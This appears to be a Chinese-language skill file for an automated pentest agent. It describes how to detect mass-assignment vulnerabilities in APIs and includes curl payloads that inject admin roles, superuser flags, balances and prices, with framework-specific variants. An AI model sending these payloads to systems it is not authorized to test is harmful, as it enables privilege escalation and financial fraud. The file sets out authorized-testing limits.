---
name: mass-assignment
description: 检测 API 中的批量赋值漏洞，通过在请求体中添加非预期字段修改不应被客户端控制的属性。
category: api
source: xalgorix
tags:
  - Mass Assignment
  - API 安全
  - 属性注入
  - OWASP API3:2023
required_tools:
  - curl
---

# 批量赋值漏洞检测

## 适用场景

- API 接受 JSON 请求体并直接映射到内部对象（ORM、DTO）。
- 需要验证客户端是否可以修改 `role`、`isAdmin`、`balance` 等敏感字段。
- 目标使用 Rails、Django、Express、Spring 等框架。

## 授权边界

- 仅尝试修改自己的测试账号，不提升正常用户的权限。
- 如发现可提权，记录 payload 但不实际提升真实用户权限。

## 前置条件

- 至少一个测试账号。
- 已识别接受 JSON 请求体的 POST/PUT/PATCH 端点。

## 执行步骤

### 步骤 1：识别可写端点

```bash
# 用户注册/更新
# POST /api/register
# PUT /api/users/me
# PATCH /api/profile
```

### 步骤 2：注入特权字段

```bash
# 通用提权 payload
curl -X POST "https://<target>/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "Test123!",
    "role": "admin",
    "isAdmin": true,
    "is_superuser": true
  }'
```

### 步骤 3：框架特定 payload

```bash
# Rails / ActiveRecord
curl -X PATCH "https://<target>/api/users/me" \
  -d '{"user": {"role": "admin", "admin": true}}'

# Django / DRF
curl -X PATCH "https://<target>/api/users/me" \
  -d '{"is_staff": true, "is_superuser": true}'

# Express / Mongoose
curl -X PUT "https://<target>/api/users/me" \
  -d '{"$set": {"role": "admin"}}'

# Spring / Jackson
curl -X PATCH "https://<target>/api/users/me" \
  -d '{"role": "ROLE_ADMIN", "authorities": ["ADMIN"]}'
```

### 步骤 4：金融和电商字段

```bash
# 价格操纵
curl -X POST "https://<target>/api/orders" \
  -d '{"product_id": 1, "quantity": 1, "total": 0.01, "discount": 100}'

# 余额修改
curl -X PATCH "https://<target>/api/users/me" \
  -d '{"balance": 99999, "credit": 99999}'
```

### 步骤 5：嵌套对象注入

```bash
# 嵌套属性注入
curl -X PATCH "https://<target>/api/users/me" \
  -d '{"profile": {"role": "admin"}, "subscription": {"plan": "enterprise"}}'
```

## 停止条件

- 发现可提权或修改金融数据时停止并记录。
- 不修改其他用户或全局配置。

## 输出格式

- 存在批量赋值的端点。
- 有效 payload 和受影响的字段。
- 框架类型和对应的绕过方法。

## 验收标准

1. 对所有 POST/PUT/PATCH 端点进行了批量赋值测试。
2. 覆盖了 role/admin/balance 等常见特权字段。
3. 测试了至少 2 种框架特定 payload。
